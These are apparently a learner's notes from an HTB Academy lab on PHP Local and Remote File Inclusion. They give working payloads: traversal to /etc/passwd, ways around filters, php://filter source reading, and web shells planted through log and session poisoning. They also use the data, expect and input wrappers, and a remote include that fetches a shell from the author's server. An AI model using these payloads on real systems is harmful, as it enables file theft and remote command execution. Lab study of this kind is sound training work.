My notes from the HTB Academy LFI/RFI module.

### Discovering LFI

## Basic

Seeing an equal sign is always a good indicator that a Local File Inclusion vulnerability may exist.

In this url: ```http://143.110.175.213:31437/basic/index.php?language=es.php``` we can replace the ***es.php*** with something more fun, like **/etc/passwd**: ```http://143.110.175.213:31437/basic/index.php?language=/etc/passwd```

Which reveals the passwd file.

## Blacklists

Bypassing blacklists can be done a few different ways. A good wordlist should explore all of them. Here is an example of running FFuF with a wordlist looking for valid LFI.

```shell
ffuf -c -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u $ip/blacklist/index.php?language=FUZZ -fw 370 -fl 65
```

The ```-fw 370 -fl 65``` were used here to weed out unwanted results.

This is a bit of php code that will negate your attempt to traverse directories by removing **../** .

An easy way around this is with **....//....//** . When **../** is removed by the script, it acutually results in **../** . Have a think about it, you'll figure it out. Using this in practice would look like ```http://143.110.175.213:31437/blacklist/index.php?language=....//....//....//....//....//etc/passwd```

You can also try to beat a blacklist with url encoding. This string is the same as the blacklist beater above: ```%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd```

Wildcard characters may also work: ```.?/.*/.?/etc/passwd```

## Appended Extensions and Wrappers

Certain php codes will append any file requested with .php. When we try to get clever and and ask for /etc/passwd, we actually end up asking for /etc/passwd.php, which obviously does not exist. By using certain **php wrappers** we can try to get clever once again.

Here is a [list of common wrappers](https://www.php.net/manual/en/wrappers.php.php), but 3 useful ones are:
* php://filter/read=convert.base64-encode/resource=/etc/passwd
* php://filter/read=string.rot13/resource=/etc/passwd
* expect://id

Using a wrapper and converting to base64 will allow us to read the *config.php* file with the following input: ```$ip/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config```

In the web browser the result looks like this:

![pic](/assets/img/lfi/lfi3.png)

```shell
curl $ip/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

Looks like this:

And decoding in Kali with ```echo $string | base64 -d``` gives up a few goodies.

### LFI to RCE

## RCE via Apache or Nginx Log Files (Log Poisoning)

Using basic LFI to view the **/var/log/apache2/acces.log** file: ```$ip/index.php?language=/var/log/apache2/access.log```

![pic](/assets/img/lfi/lfi6.png)

Fire up Burpsuite and catch the request. Modify the User-Agent to something else and see if it shows up in the log.

![pic](/assets/img/lfi/lfi7.png)

A bit easier to see in *pretty* mode.

![pic](/assets/img/lfi/lfi8.png)

Since we know we can poison the log, let's put something more fun than a flying monkey in the User-Agent field like a php shell: ```<?php system($_GET['mnky']); ?>```. Append the GET request with ```&mnky=id``` and we should be able to see the id command executed.

![pic](/assets/img/lfi/lfi10.png)

We can see the id command was executed in the response.

Other files worth investigating:

* /var/log/nginx/access.log
* /var/log/sshd.log
* /var/log/mail
* /var/log/vsftpd.log

## RCE via PHP Session Files

PHPSESSID in Burp:

![pic](/assets/img/lfi/lfi11.png)

This should be logged in **/var/lib/php/sessions/sess_inl681c2i54l6022ttsaa8p2fm** so let's use basic LFI to poison the session with *Flying M0nkey*: ```$ip/index.php?language=Flying_M0nkey``` and then check the session with: ```$ip/index.php?language=/var/lib/php/sessions/sess_inl681c2i54l6022ttsaa8p2fm```.

Huzzah!

![pic](/assets/img/lfi/lfi12.png)

Now doing the same with our web shell: ```$ip/index.php?language=<?php system($_GET['mnky']); ?>```.

![pic](/assets/img/lfi/lfi13.png)

We should now be able to issue a command: ```$ip/index.php?language=/var/lib/php/sessions/sess_inl681c2i54l6022ttsaa8p2fm&mnky=uname+-a```. I've gone for **uname -a**; note the plus sign used to take up the space in the url.

## Data Wrapper

The data wrapper can be used to include external data, even PHP code. It's possible to use this only if the allow_url_include setting is enabled in the PHP configuration. This can be found in the file /etc/php/X.Y/apache2/php.ini for Apache and in /etc/php/X.Y/fpm/php.ini for php-fpm used by Nginx, where X.Y is your install PHP version.

base64 encode our php shell.

![pic](/assets/img/lfi/lfi15.png)

Submit the url: ```$ip/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW21ua3ldKTsgPz4K&mnky=id``` and hopefully we will see the *id* command executed.

## Expect Wrapper

The expect wrapper in PHP helps in interaction with process streams. This extension is disabled by default but can prove very useful if enabled. ```$ip/index.php?language=expect://id```

## Inupt Wrapper

Similar to the data wrapper, the input wrapper can be used to include external input and execute code. It also needs the allow_url_include setting enabled. The following curl command sends a POST request with a system command and then includes it using php://input, which gets executed by the page.

```shell
curl -s -X POST --data "<?php system('id'); ?>" "$ip/index.php?language=php://input" | grep uid
```

Using the input wrapper to read /secrets/flag.txt.

### Remote File Inclusion

To include a remote file in PHP, the allow_url_fopen setting (enabled by default) and allow_url_include setting have to be turned on.

The mnky.php file has a php one liner in it. Start a server and get it with the RFI: ```$ip/index.php?language=http://10.10.15.208/mnky.php?mnky=id```

You can see that a request is made to my Python server and and it executes the id command on the web page.

That's it for now; I'm sure there will be more added all the time.

M0nkey out.
